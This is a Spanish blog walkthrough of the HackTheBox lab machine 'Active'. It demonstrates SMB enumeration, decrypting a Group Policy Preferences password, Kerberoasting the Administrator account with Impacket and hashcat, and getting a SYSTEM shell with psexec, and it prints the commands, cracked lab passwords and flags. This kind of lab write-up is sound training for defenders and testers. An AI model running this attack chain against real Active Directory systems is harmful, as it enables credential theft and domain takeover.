
---
title: "Active"
summary: "Active es una máquina de dificultad fácil a media, que cuenta con dos técnicas muy comunes para obtener privilegios dentro de un entorno de Active Directory. Esta máquina nos enseña sobre las Preferencias de Directivas de Grupo (GPP) de Windows y contraseñas y cómo abusar de ellas."
categories: ["Post","Blog",]
tags: ["post","hackthebox","windows"]
#externalUrl: ""
#showSummary: true
draft: false
date: 2025-01-06

---

| Información de la máquina | |
| -------------------- | ------------ |
| **Plataforma** | HackTheBox |
| **Sistema operativo** | Windows |
| **Dificultad** | Fácil |
| **IP** | 10.10.10.100 |
- - -
## Enumeración

Comencemos la enumeración con `Nmap`:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.100 -oN ports

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-04 18:47:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-04T18:48:37
|_  start_date: 2025-01-04T18:21:40
|_clock-skew: -1s
```

Hay bastantes puertos abiertos. Podemos comenzar la enumeración comprobando si hay alguna información sobre los recursos compartidos **SMB**:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ smbclient -N -L \\10.10.10.100 

Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      

```

El recurso compartido _Replicación_ tiene información a la que podemos acceder:

```bash
smb: \> ls

  active.htb                          D        0  Sat Jul 21 00:37:44 2018
```

- - -
## Recopilación de credenciales
Descubrimos una contraseña en `Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml`.

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ cat Groups.xml 

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

El archivo **Groups.xml** se crea automáticamente en el recurso compartido `SYSVOL` cuando se crea una _Preferencia de directiva de grupo_. El archivo contiene información relacionada con los grupos, incluso contraseñas. Estas están cifradas con una clave privada de Microsoft, pero se publicó por accidente.

Esto es bastante antiguo (de alrededor de 2014), pero es un gran conocimiento, ya que si un sistema contiene archivos antiguos que contienen una contraseña cifrada a partir de una _Preferencia de directiva de grupo_, se puede descifrar con la herramienta `gpp-decrypt`.

```bash
┌──(s3n㉿kali)-[~]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```

Después de encontrar la contraseña para el usuario _SVC_TGS_, deberíamos echar un vistazo a los recursos compartidos a los que no pudimos acceder, como **Usuarios**, para verificar si obtuvimos algún privilegio sobre ellos.

```bash
┌──(s3n㉿kali)-[~]
└─$ smbclient \\\\10.10.10.100\\Users -W active.htb -U SVC_TGS 
Password for [ACTIVE.HTB\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 04:39:20 2018
  ..                                 DR        0  Sat Jul 21 04:39:20 2018
  Administrator                       D        0  Mon Jul 16 00:14:21 2018
  All Users                       DHSrn        0  Mon Jul 13 19:06:44 2009
  Default                           DHR        0  Mon Jul 13 20:38:21 2009
  Default User                    DHSrn        0  Mon Jul 13 19:06:44 2009
  desktop.ini                       AHS      174  Mon Jul 13 18:57:55 2009
  Public                             DR        0  Mon Jul 13 18:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 05:16:32 2018
```

Parece que funcionó. Enumeramos nuevamente pero no encontramos nada relevante.

>Podríamos reclamar la bandera de usuario en el directorio SVC_TGS/Desktop pero no lo haré, ya que no contaría en exámenes como OSCP, ya que se necesita un shell interactivo.

Con el usuario _SVC_TGS_ parece que no tenemos una manera de obtener un punto de apoyo en la máquina mientras intentaba usar RDP. Sin embargo, podemos continuar enumerando la red interna ya que tenemos credenciales válidas con este usuario.
- - -
## Kerberoasting
**Kerberoasting** es una técnica de post-explotación que podemos utilizar al evaluar entornos de Active Directory (AD). El objetivo es obtener el hash de contraseña de una cuenta de servicio asociada con un _Service Principal Name_ (SPN). Los SPN son atributos en AD que vinculan de forma única un servicio a una cuenta de usuario, lo que permite la autenticación Kerberos.

En este escenario, como usuarios de dominio autenticados, solicitamos un ticket de servicio Kerberos para un SPN. El controlador de dominio genera el ticket y lo cifra utilizando el hash NTLM de la contraseña de la cuenta de servicio vinculada al SPN. Luego se nos proporciona este ticket. En esta etapa, no necesitamos privilegios elevados, solo una cuenta de usuario de dominio válida para solicitar el ticket.

Una vez que recuperamos el ticket cifrado, podemos descifrarlo sin conexión utilizando herramientas como `Hashcat`. Si tenemos éxito, recuperamos la contraseña de texto simple de la cuenta de servicio.

Podemos intentar verificar los SPN de los usuarios con la herramienta `GetUserSPN` de Impacket:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon/Users_Share]
└─$ sudo impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 09:06:40.351723  2025-01-04 08:22:56.876969             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$00000811e6a2b622980085c3ea266f01$c9cab36b5168bd9a37c25b64bc43aebb6540b44867f3599f0a407d18ad616cf7af9674a71536b36dd1a5010bd6f9bde15ce5e2840134ca36c87da075...8ca32608b5c667b3abeabe5e73fb859a5d002f4ba2472875cf6e40a592e178ad267ae199713a5a84b51b7b52665667ac3e62bb2ab566d2076c7ce31b7f7e25605dc1f4d7854ac3faf219b78b8
```

¡Genial! Ya lo tenemos. Ahora podemos intentar descifrar este hash con `hashcat`:

```bash
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$00000811e6a2b622980085c3ea266f01$c9cab36b5168bd9a37c25b64bc43aebb6540b44867f3599f0a407d18ad616cf7af9674a71536b36dd1a5010bd6f9bde15ce5e2840134ca36c87da075...8ca32608b5c667b3abeabe5e73fb859a5d002f4ba2472875cf6e40a592e178ad267ae199713a5a84b51b7b52665667ac3e62bb2ab566d2076c7ce31b7f7e25605dc1f4d7854ac3faf219b78b8:Ticketmaster1968
```

Encontramos la contraseña del administrador con el valor **Ticketmaster1968**. Podemos intentar abusar de SMB para establecer un shell con `psexec`:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ impacket-psexec Administrator@10.10.10.100        
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file zOdNJqkf.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service ROhE on 10.10.10.100.....
[*] Starting service ROhE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Ahora podemos leer ambas flags!:

```powershell
C:\> type C:\Users\SVC_TGS\Desktop\user.txt  
40538eb1a29a0cef0b8d9a4d7a3a387f
```

```powershell
C:\> type C:\Users\Administrator\Desktop\root.txt
b8737ca7bc28f8b9dcce856e5226956d
```


